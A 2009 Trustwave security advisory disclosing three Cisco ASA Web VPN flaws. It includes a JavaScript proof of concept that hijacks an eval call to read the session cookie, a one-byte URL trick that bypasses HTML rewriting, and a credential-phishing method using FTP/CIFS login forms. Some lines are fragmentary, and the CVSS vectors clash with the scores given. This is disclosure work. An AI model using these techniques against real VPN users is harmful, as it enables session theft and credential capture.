Trustwave's SpiderLabs Security Advisory TWSL2009-002: 
Cisco ASA Web VPN Multiple Vulnerabilities

Published: 2009-06-24 Version: 1.0

Vendor: Cisco Systems, Inc. (http://www.cisco.com)

Versions affected: 8.0(4), 8.1.2, and 8.2.1

Description: Cisco's Adaptive Security Appliance (ASA)
provides a number of security related features, including
"Web VPN" functionality that allows authenticated users to
access a variety of content through a web interface. This
includes other web content, FTP servers, and CIFS file
servers.

The web content is proxied by the ASA and rewritten so that
any URLs in the web content are passed as query parameters
sent to the ASA web interface. Where scripting content is
present, the ASA places a JavaScript wrapper around the
original webpage's Document Object Model (DOM), to prevent
the webpage from accessing the ASA's DOM.

Finding 1: Post-Authentication Cross-Site Scripting
CVE: CVE-2009-1201
The ASA's DOM wrapper can be rewritten in a manner to allow
Cross-Site Scripting (XSS) attacks. For example, the
"csco_wrap_js" JavaScript function in /+CSCOL+/cte.js makes
a call to a function referenced by "CSCO_WebVPN['process']".
The result of this call is then used in an "eval" statement.

function csco_wrap_js(str)
{
   var ret="<script id=CSCO_GHOST src="+CSCO_Gateway+
           "/+CSCOL+/cte.js></scr"+
           "ipt><script id=CSCO_GHOST src="+
           CSCO_Gateway+"/+CSCOE+/apcf></sc"+"ript>";
   var js_mangled=CSCO_WebVPN['process']('js',str);
   ret+=CSCO_WebVPN['process']('html',eval(js_mangled));
   return ret;
};

To exploit this behavior, a malicious page can rewrite
"CSCO_WebVPN['process']" with an attacker-defined function
that will return an arbitrary value. The next time the
"csco_wrap_js" function is called, the malicious code will
be executed. Below is a proof of concept.

<html><script>
function a(b, c)
{
   return "alert('Your VPN location:\\n\\n'+" +
   "document.location+'\\n\\n\\n\\n\\n" +
   "Your VPN cookie:\\n\\n'+document.cookie);";
}
CSCO_WebVPN['process'] = a;
csco_wrap_js('');
</script></html>

Vendor Response:
This vulnerability has been corrected in versions 8.0.4.34,
and 8.1.2.25.

documented in Cisco Bug ID:  CSCsy80694.

CVSS Score: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:U/RC:C
Base: 4.3
Temporal: 3.9


Finding 2: HTML Rewriting Bypass
CVE: CVE-2009-1202
When a webpage is requested through the ASA's Web VPN, the
targeted scheme and hostname is Rot13-encoded, then
hex-encoded and placed in the ASA's URL. For example,
"http://www.trustwave.com" is accessed by requesting the
following ASA path:
      
/+CSCO+0075676763663A2F2F6A6A6A2E67656866676A6E69722E70627A+
+/

The HTML content of this request is obviously reformatted by
the ASA, starting at the very beginning:

      <script id='CSCO_GHOST' src="/+webvpn+/toolbar.js">

However, if the request URL is modified to change the
initial hex value of "00" to "01", the HTML document is
returned without any rewriting. This allows the pages
scriptable content to run in the ASA's DOM, making
Cross-Site Scripting trivial.

Vendor Response:
This vulnerability has been corrected in versions 8.0.4.34,
and 8.1.2.25.

CSCsy80705.

CVSS Score: AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:U/RC:C
Base: 4.3
Temporal: 3.9


Finding 3: Authentication Credential Theft
CVE: CVE-2009-1203
When a user accesses an FTP or CIFS destination using the
Web VPN, the resulting URL is formatted in a similar manner
as the web requests described above. The following URL
attempts to connect to ftp.example.com; normally, it would
be in an HTML frame within the Web VPN website.

      
/+CSCOE+/files/browse.html?code=init&path=ftp%3A%2F%2F736763
2e726b6e7a6379722e70627a

The ASA first attempts to connect to the FTP server or CIFS
share using anonymous credentials. If those fail, the user
is prompted for login credentials. When viewed on its own
(outside of a frame), the submission form gives no
indication what it is for and is very similar in appearance
to the Web VPN's primary login page. If the URL was sent to
a user by an attacker, it is very possible that a user would
assume that he needs to resubmit credentials to the Web VPN.
The ASA would then forward the credentials to the attacker's
FTP or CIFS server.

and 8.1.2.25.
